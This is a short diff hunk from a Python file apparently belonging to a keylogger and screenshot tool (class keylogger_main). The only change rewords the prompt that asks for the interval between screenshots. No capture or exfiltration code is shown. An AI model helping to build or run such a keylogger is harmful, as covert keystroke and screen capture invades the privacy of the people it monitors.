@@ -68,7 +68,7 @@ class keylogger_main:
         
         
 km=keylogger_main() 
-interval=int(input("Enter the time interval which you want to be there in between each Screenshot:"))
+interval=int(input("Enter the time interval between each Screenshot:"))
 km.run(interval)
 
 
